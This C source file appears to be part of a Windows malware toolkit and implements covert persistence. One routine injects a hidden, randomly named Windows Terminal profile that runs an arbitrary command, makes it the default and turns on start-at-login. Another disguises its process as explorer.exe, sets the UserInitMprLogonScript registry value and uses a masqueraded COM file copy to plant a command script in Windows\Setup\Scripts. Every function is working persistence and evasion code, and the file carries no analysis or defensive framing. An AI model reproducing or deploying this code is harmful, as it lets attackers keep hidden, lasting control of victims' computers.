#include "pch.h"

LPWSTR WTFindSettingPath(VOID)
{
	WCHAR lpLocalAppData[MAX_PATH];
	DWORD cbLocalAppData;
	LPWSTR lpResult = NULL;
	LPWSTR* PathList = NULL;

	RtlSecureZeroMemory(lpLocalAppData, sizeof(lpLocalAppData));
	if (ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Packages", lpLocalAppData, MAX_PATH) >= MAX_PATH) {
		goto CLEANUP;
	}

	PathList = ListFileWithFilter(lpLocalAppData, L"Microsoft.WindowsTerminal_*", LIST_JUST_FOLDER, NULL);
	if (PathList == NULL) {
		goto CLEANUP;
	}

	lpResult = DuplicateStrW(PathList[0], lstrlenW(L"\\LocalState\\settings.json"));
	lstrcatW(lpResult, L"\\LocalState\\settings.json");
CLEANUP:
	FREE(PathList);

	return lpResult;
}

BOOL WTChangeSettingsFile
(
	_In_ LPWSTR lpPath,
	_In_ LPSTR lpCommandLine
)
{
	LPSTR lpJsonData = NULL;
	BOOL Result = FALSE;
	DWORD dwInsertedPoint = 0;
	LPSTR lpGuid = NULL;
	CHAR szInsertedStr[0x400];
	DWORD cbInsertedStr = 0;
	LPSTR lpDoulbeSlashPath = NULL;
	LPSTR lpRandomStr = NULL;
	LPSTR lpNewJsonData = NULL;
	LPSTR lpTemp = NULL;

	lpJsonData = ReadFromFile(lpPath, NULL);
	if (lpJsonData == NULL) {
		goto CLEANUP;
	}

	lpGuid = GenGUIDStrA();
	if (lpGuid == NULL) {
		goto CLEANUP;
	}

	lpDoulbeSlashPath = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
	lpRandomStr = GenRandomStr(6);
	wsprintfA(szInsertedStr, "            {\n                \"commandline\": \"%s\",\n                \"guid\": \"%s\",\n                \"hidden\": true,\n                \"name\": \"%s\"\n            },\n", lpDoulbeSlashPath, lpGuid, lpRandomStr);

	dwInsertedPoint = StrStrA(lpJsonData, "\n    \"profiles\": \n") - lpJsonData + lstrlenA("\n    \"profiles\": \n");
	dwInsertedPoint = StrStrA(lpJsonData + dwInsertedPoint, "\n        \"list\": \n        [\n") - lpJsonData + lstrlenA("\n        \"list\": \n        [\n");
	lpNewJsonData = StrInsertA(lpJsonData, szInsertedStr, dwInsertedPoint);
	dwInsertedPoint = StrStrA(lpNewJsonData, "\n    \"defaultProfile\": \"") - lpNewJsonData + lstrlenA("\n    \"defaultProfile\": \"");
	memcpy(lpNewJsonData + dwInsertedPoint, lpGuid, lstrlenA(lpGuid));
	lpTemp = StrStrA(lpNewJsonData, "\n    \"startOnUserLogin\": ");
	if (lpTemp) {
		dwInsertedPoint = lpTemp - lpNewJsonData + lstrlenA("\n    \"startOnUserLogin\": ");
		if (!IsStrStartsWithA(lpNewJsonData + dwInsertedPoint, "true")) {
			lpTemp = StrReplaceA(lpNewJsonData + dwInsertedPoint, "false", "true", FALSE, 1);
			lpNewJsonData[dwInsertedPoint] = '\0';
			lstrcatA(lpNewJsonData, lpTemp);
			FREE(lpTemp);
		}
	}
	else {
		dwInsertedPoint += lstrlenA(lpGuid) + 3;
		lpTemp = StrInsertA(lpNewJsonData, "    \"startOnUserLogin\": true,\n", dwInsertedPoint);
		FREE(lpNewJsonData);
		lpNewJsonData = lpTemp;
	}

	WriteToFile(lpPath, lpNewJsonData, lstrlenA(lpNewJsonData));
	Result = TRUE;
CLEANUP:
	FREE(lpGuid);
	FREE(lpDoulbeSlashPath);
	FREE(lpNewJsonData);
	FREE(lpRandomStr);
	FREE(lpJsonData);

	return Result;
}

BOOL WTIsPersistenceExist
(
	_In_ LPWSTR lpPath,
	_In_ LPSTR lpCommandLine
)
{
	LPSTR lpJsonData = NULL;
	BOOL Result = FALSE;
	LPSTR lpDoulbeSlashPath = NULL;
	DWORD dwPos = 0;
	CHAR szGUID[39];
	LPSTR lpTemp = NULL;

	lpJsonData = ReadFromFile(lpPath, NULL);
	if (lpJsonData == NULL) {
		goto CLEANUP;
	}

	lpDoulbeSlashPath = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
	if (!StrStrA(lpJsonData, lpDoulbeSlashPath)) {
		goto CLEANUP;
	}

	if (!StrStrA(lpJsonData, "\n    \"startOnUserLogin\": true")) {
		goto CLEANUP;
	}

	dwPos = StrStrA(lpJsonData, "\n    \"defaultProfile\": \"") - lpJsonData + lstrlenA("\n    \"defaultProfile\": \"");
	RtlSecureZeroMemory(szGUID, sizeof(szGUID));
	memcpy(szGUID, lpJsonData + dwPos, 38);
	lpTemp = StrStrA(lpJsonData, "\n        \"list\": \n        [\n");
	if (!lpTemp) {
		goto CLEANUP;
	}

	lpTemp = StrStrA(lpJsonData, lpDoulbeSlashPath) + lstrlenA(lpDoulbeSlashPath) + lstrlenA("\",\n                \"guid\": \"");
	if (memcmp(lpTemp, szGUID, lstrlenA(szGUID))) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FREE(lpJsonData);
	FREE(lpDoulbeSlashPath);

	return Result;
}

BOOL WTStartPersistence
(
	_In_ LPSTR lpCommandLine
)
{
	LPWSTR lpSettingsPath = NULL;
	BOOL Result = FALSE;

	lpSettingsPath = WTFindSettingPath();
	if (lpSettingsPath == NULL) {
		goto CLEANUP;
	}

	if (!WTIsPersistenceExist(lpSettingsPath, lpCommandLine)) {
		WTChangeSettingsFile(lpSettingsPath, lpCommandLine);
	}

	Result = TRUE;
CLEANUP:
	FREE(lpSettingsPath);

	return Result;
}

BOOL SetupScriptMethod
(
	_In_ LPSTR lpCommandLine
)
{
	PBYTE pCmdContent = NULL;
	DWORD cbCmdContent = 0;
	BOOL Result = FALSE;
	LPWSTR lpCmdPath = NULL;
	WCHAR wszDest[MAX_PATH];

	cbCmdContent = lstrlenA(lpCommandLine) + lstrlenA("@echo off\n");
	pCmdContent = ALLOC(cbCmdContent + 1);
	wsprintfA(pCmdContent, "@echo off\n%s", lpCommandLine);
	if (!WriteToTempPath(pCmdContent, cbCmdContent, L"cmd", &lpCmdPath)) {
		goto CLEANUP;
	}

	RtlSecureZeroMemory(wszDest, sizeof(wszDest));
	GetWindowsDirectoryW(wszDest, MAX_PATH);
	lstrcatW(wszDest, L"\\Setup\\Scripts");
	if (!MasqueradedMoveCopyDirectoryFileCOM(lpCmdPath, wszDest, TRUE)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FREE(pCmdContent);
	FREE(lpCmdPath);

	return Result;
}

BOOL PersistenceMethod1
(
	_In_ LPSTR lpCommandLine
)
{
	LSTATUS Status = STATUS_SUCCESS;
	BOOL Result = FALSE;
	WCHAR wszSetupPath[MAX_PATH];
	WCHAR wszExplorerPath[MAX_PATH];
	LPWSTR BackupPath[5];

	RtlSecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
	lstrcatW(wszExplorerPath, L"\\explorer.exe");
	RtlSecureZeroMemory(BackupPath, sizeof(BackupPath));
	MasqueradeProcessPath(wszExplorerPath, FALSE, BackupPath);
	RtlSecureZeroMemory(wszSetupPath, sizeof(wszSetupPath));
	GetSystemDirectoryW(wszSetupPath, _countof(wszSetupPath));
	lstrcatW(wszSetupPath, L"\\oobe\\Setup.exe");
	Status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"UserInitMprLogonScript", REG_SZ, wszSetupPath, (lstrlenW(wszSetupPath) + 1) * sizeof(WCHAR));
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("RegSetKeyValueW", Status);
		goto CLEANUP;
	}

	if (!SetupScriptMethod(lpCommandLine)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	MasqueradeProcessPath(NULL, TRUE, BackupPath);
	return Result;
}